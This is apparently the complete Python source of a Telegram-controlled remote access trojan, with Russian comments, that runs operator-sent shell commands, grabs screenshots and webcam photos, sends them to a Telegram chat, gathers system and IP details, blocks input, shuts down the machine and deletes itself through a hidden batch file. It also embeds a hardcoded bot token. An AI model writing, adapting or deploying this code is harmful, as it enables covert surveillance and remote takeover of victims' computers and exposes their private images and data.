import os
import sys
import telebot
import subprocess
import pyautogui
import psutil
import platform
import socket
import requests
import time
import threading
import ctypes
from PIL import ImageGrab
import cv2

# ===== КОНФИГУРАЦИЯ =====
TOKEN = "8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU"  # Замените на реальный токен
bot = telebot.TeleBot(TOKEN)

# ===== ПРОВЕРЕННЫЕ ФУНКЦИИ =====

def take_screenshot():
    """Создание скриншота"""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        return "screenshot.png"
    except Exception as e:
        return f"Ошибка создания скриншота: {str(e)}"

def execute_command(cmd):
    """Выполнение команд CMD"""
    try:
        result = subprocess.run(
            ["cmd", "/c", cmd],
            capture_output=True,
            text=True,
            encoding='cp866'
        )
        return result.stdout or result.stderr
    except Exception as e:
        return f"Ошибка выполнения команды: {str(e)}"

def get_system_info():
    """Получение системной информации"""
    try:
        mem = psutil.virtual_memory()
        return (
            "💻 Системная информация:\n"
            f"ОС: {platform.system()} {platform.release()}\n"
            f"Процессор: {platform.processor() or 'Не определен'}\n"
            f"Память: {round(mem.total / (1024 ** 3), 1)} GB\n"
            f"Использовано: {mem.percent}%"
        )
    except Exception as e:
        return f"Ошибка получения системной информации: {str(e)}"

def get_network_info():
    """Получение сетевой информации"""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        external_ip = requests.get('https://api.ipify.org', timeout=5).text
        return (
            "🌐 Сетевая информация:\n"
            f"Имя ПК: {hostname}\n"
            f"Внутренний IP: {ip}\n"
            f"Внешний IP: {external_ip}"
        )
    except Exception as e:
        return f"Ошибка получения сетевой информации: {str(e)}"

def change_volume(direction):
    """Изменение громкости"""
    try:
        key = "volumeup" if direction == "up" else "volumedown"
        for _ in range(5):
            pyautogui.press(key)
            time.sleep(0.1)
        return "🔊 Громкость изменена!"
    except Exception as e:
        return f"Ошибка изменения громкости: {str(e)}"

def lock_computer():
    """Блокировка компьютера"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.LockWorkStation()
            return "🔒 Компьютер заблокирован!"
        return "❌ Функция доступна только на Windows"
    except Exception as e:
        return f"Ошибка блокировки: {str(e)}"

def shutdown_computer():
    """Выключение компьютера"""
    try:
        if platform.system() == "Windows":
            os.system("shutdown /s /t 5")
            return "🔌 Выключение через 5 секунд!"
        return "❌ Функция доступна только на Windows"
    except Exception as e:
        return f"Ошибка выключения: {str(e)}"

def run_paint_app():
    """Запуск Paint"""
    try:
        if platform.system() == "Windows":
            os.system("start mspaint")
            return "🎨 Paint запущен!"
        return "❌ Функция доступна только на Windows"
    except Exception as e:
        return f"Ошибка запуска Paint: {str(e)}"

def left_click():
    """Левый клик мыши"""
    try:
        pyautogui.click()
        return "🖱️ Левый клик выполнен!"
    except Exception as e:
        return f"Ошибка выполнения клика: {str(e)}"

def right_click():
    """Правый клик мыши"""
    try:
        pyautogui.click(button='right')
        return "🖱️ Правый клик выполнен!"
    except Exception as e:
        return f"Ошибка выполнения клика: {str(e)}"

def press_key(key):
    """Нажатие клавиши"""
    try:
        pyautogui.press(key)
        return f"⌨️ Клавиша '{key}' нажата!"
    except Exception as e:
        return f"Ошибка нажатия клавиши: {str(e)}"

def block_input(seconds):
    """Блокировка ввода на указанное время"""
    try:
        if platform.system() == "Windows":
            # Блокируем ввод
            ctypes.windll.user32.BlockInput(True)
            # Запускаем таймер для разблокировки
            timer = threading.Timer(seconds, unblock_input)
            timer.start()
            return f"⛔ Ввод заблокирован на {seconds} секунд!"
        return "❌ Функция доступна только на Windows"
    except Exception as e:
        return f"Ошибка блокировки ввода: {str(e)}"

def unblock_input():
    """Разблокировка ввода"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.BlockInput(False)
    except:
        pass

def show_notification(title, message):
    """Показ пуш-уведомления"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
            return "📢 Уведомление показано!"
        return "❌ Функция доступна только на Windows"
    except Exception as e:
        return f"Ошибка показа уведомления: {str(e)}"

def take_webcam_photo():
    """Сделать фото с веб-камеры"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "❌ Веб-камера недоступна"
            
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('webcam.jpg', frame)
            return "webcam.jpg"
        return "❌ Не удалось получить изображение"
    except Exception as e:
        return f"Ошибка доступа к веб-камере: {str(e)}"
    finally:
        if 'cap' in locals():
            cap.release()

def self_destruct():
    """Самоуничтожение RAT"""
    try:
        if platform.system() == "Windows":
            # Создаем батник для удаления
            bat_path = os.path.join(os.getenv('TEMP'), 'uninstall.bat')
            exe_path = os.path.abspath(sys.argv[0])
            
            with open(bat_path, 'w') as f:
                f.write('@echo off\n')
                f.write('timeout /t 3 /nobreak > nul\n')
                f.write(f'del /f "{exe_path}"\n')
                f.write(f'del /f "{bat_path}"\n')
            
            # Запускаем батник в скрытом режиме
            subprocess.Popen(
                f'start /B cmd /c "{bat_path}"',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return "💀 RAT будет удален через 3 секунды!"
        return "❌ Функция доступна только на Windows"
    except Exception as e:
        return f"Ошибка самоуничтожения: {str(e)}"

# ===== ГЛАВНОЕ МЕНЮ =====
def create_main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.row("🖥 Системная информация", "🌐 Сетевая информация")
    markup.row("📸 Скриншот", "📷 Веб-камера")
    markup.row("💻 Выполнить команду", "⌨️ Нажать клавишу")
    markup.row("🖱️ Левый клик", "🖱️ Правый клик")
    markup.row("🔒 Блокировать ПК", "⛔ Блокировка ввода (10 сек)")
    markup.row("🔌 Выключить ПК", "📢 Показать уведомление")
    markup.row("🔈 Увеличить громкость", "🔉 Уменьшить громкость")
    markup.row("🖼 Запустить Paint", "💀 Удалить RAT")
    return markup

# ===== ОБРАБОТЧИКИ КОМАНД =====

@bot.message_handler(commands=['start', 'help'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🖥 Добро пожаловать в систему удаленного управления!\n"
        "Выберите действие:",
        reply_markup=create_main_menu()
    )

@bot.message_handler(func=lambda m: m.text == "🖥 Системная информация")
def system_info(message):
    bot.send_message(message.chat.id, get_system_info())

@bot.message_handler(func=lambda m: m.text == "🌐 Сетевая информация")
def network_info(message):
    bot.send_message(message.chat.id, get_network_info())

@bot.message_handler(func=lambda m: m.text == "📸 Скриншот")
def send_screenshot(message):
    try:
        screenshot_path = take_screenshot()
        if screenshot_path.startswith("❌") or screenshot_path.startswith("Ошибка"):
            bot.send_message(message.chat.id, screenshot_path)
        else:
            with open(screenshot_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(screenshot_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@bot.message_handler(func=lambda m: m.text == "📷 Веб-камера")
def send_webcam_photo(message):
    try:
        webcam_path = take_webcam_photo()
        if webcam_path.startswith("❌") or webcam_path.startswith("Ошибка"):
            bot.send_message(message.chat.id, webcam_path)
        else:
            with open(webcam_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(webcam_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@bot.message_handler(func=lambda m: m.text == "💻 Выполнить команду")
def cmd_prompt(message):
    msg = bot.send_message(message.chat.id, "Введите команду для выполнения:")
    bot.register_next_step_handler(msg, handle_command)

def handle_command(message):
    result = execute_command(message.text)
    if len(result) > 4000:
        for i in range(0, len(result), 4000):
            bot.send_message(message.chat.id, f"💻 Результат (часть {i//4000 + 1}):\n{result[i:i+4000]}")
    else:
        bot.send_message(message.chat.id, f"💻 Результат:\n{result}")

@bot.message_handler(func=lambda m: m.text == "⌨️ Нажать клавишу")
def press_key_menu(message):
    msg = bot.send_message(message.chat.id, "Введите клавишу для нажатия (например: a, enter, space):")
    bot.register_next_step_handler(msg, handle_key_press)

def handle_key_press(message):
    response = press_key(message.text)
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda m: m.text == "🖱️ Левый клик")
def mouse_left_click(message):
    bot.send_message(message.chat.id, left_click())

@bot.message_handler(func=lambda m: m.text == "🖱️ Правый клик")
def mouse_right_click(message):
    bot.send_message(message.chat.id, right_click())

@bot.message_handler(func=lambda m: m.text == "🔒 Блокировать ПК")
def lock_pc(message):
    bot.send_message(message.chat.id, lock_computer())

@bot.message_handler(func=lambda m: m.text == "⛔ Блокировка ввода (10 сек)")
def block_input_menu(message):
    bot.send_message(message.chat.id, block_input(10))

@bot.message_handler(func=lambda m: m.text == "🔌 Выключить ПК")
def shutdown_pc(message):
    bot.send_message(message.chat.id, shutdown_computer())

@bot.message_handler(func=lambda m: m.text == "📢 Показать уведомление")
def notification_menu(message):
    msg = bot.send_message(message.chat.id, "Введите текст уведомления:")
    bot.register_next_step_handler(msg, handle_notification)

def handle_notification(message):
    response = show_notification("RAT Уведомление", message.text)
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda m: m.text == "🔈 Увеличить громкость")
def volume_up(message):
    bot.send_message(message.chat.id, change_volume("up"))

@bot.message_handler(func=lambda m: m.text == "🔉 Уменьшить громкость")
def volume_down(message):
    bot.send_message(message.chat.id, change_volume("down"))

@bot.message_handler(func=lambda m: m.text == "🖼 Запустить Paint")
def run_paint(message):
    bot.send_message(message.chat.id, run_paint_app())

@bot.message_handler(func=lambda m: m.text == "💀 Удалить RAT")
def uninstall_rat(message):
    response = self_destruct()
    bot.send_message(message.chat.id, response)

# ===== ЗАПУСК БОТА =====
def run_bot():
    print("Бот запущен...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Ошибка: {str(e)}")
        time.sleep(10)
        run_bot()

if __name__ == "__main__":
    # Установите необходимые библиотеки:
    # pip install pytelegrambotapi pyautogui pillow psutil requests opencv-python
    
    # Запуск в отдельном потоке для стабильности
    threading.Thread(target=run_bot).start()